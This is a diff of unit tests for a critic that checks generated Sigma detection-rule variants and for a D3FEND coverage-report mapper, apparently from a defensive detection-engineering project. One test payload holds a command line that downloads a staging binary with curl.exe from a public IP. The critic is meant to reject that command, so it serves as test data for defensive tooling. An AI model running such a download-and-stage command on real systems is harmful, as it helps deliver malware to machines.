@@ -66,7 +66,7 @@ class SwarmCriticTests(unittest.TestCase):
         self.assertFalse(verdict.passed)
         self.assertIn("Forbidden destination", verdict.reason)
 
-    def test_critic_rejects_routable_ip(self):
+    def test_critic_rejects_non_reserved_ip(self):
         variant = Variant(
             id="test-2",
             target_type="sigma",
@@ -76,13 +76,13 @@ class SwarmCriticTests(unittest.TestCase):
             payload={
                 "ParentImage": "C:\\Windows\\explorer.exe",
                 "Image": "C:\\Windows\\System32\\curl.exe",
-                "CommandLine": "curl.exe http://198.51.100.25/stage.bin",
+                "CommandLine": "curl.exe http://8.8.8.8/stage.bin",
             },
             cycle=1,
         )
         verdict = self.critic.evaluate(variant)
         self.assertFalse(verdict.passed)
-        self.assertIn("Routable IPv4", verdict.reason)
+        self.assertIn("Non-reserved IPv4", verdict.reason)
 
     def test_critic_rejects_invalid_xml_syntax(self):
         variant = Variant(
@@ -111,7 +111,7 @@ class SwarmCriticTests(unittest.TestCase):
         verdict = self.critic.evaluate(variant)
         self.assertTrue(verdict.passed, f"Safe variant rejected: {verdict.reason}")
 
-    def test_critic_rejects_routable_ipv6_literal(self):
+    def test_critic_rejects_non_reserved_ipv6_literal(self):
         variant = Variant(
             id="test-5",
             target_type="sigma",
@@ -127,7 +127,7 @@ class SwarmCriticTests(unittest.TestCase):
         )
         verdict = self.critic.evaluate(variant)
         self.assertFalse(verdict.passed)
-        self.assertIn("Routable IPv6", verdict.reason)
+        self.assertIn("Non-reserved IPv6", verdict.reason)
 
     def test_critic_allows_loopback_and_link_local_ipv6(self):
         variant = Variant(
@@ -1736,7 +1736,10 @@ class D3fendMapperTests(unittest.TestCase):
         md = self.mapper.build().to_markdown()
         self.assertIn("Dual-Layer Coverage Assessment", md)
         self.assertIn("Taxonomy status", md)
-        self.assertIn("Zero identifier collisions detected", md)
+        # The artifact used to claim every countermeasure identifier had been verified against
+        # the D3FEND ontology; the module only hand-verifies a subset, so the wording is scoped.
+        self.assertIn("Not every identifier has been verified against the ontology", md)
+        self.assertNotIn("All countermeasure identifiers have been verified", md)
         self.assertIn("Confidence.", md)
 
     def test_export_writes_dual_layer_json(self):
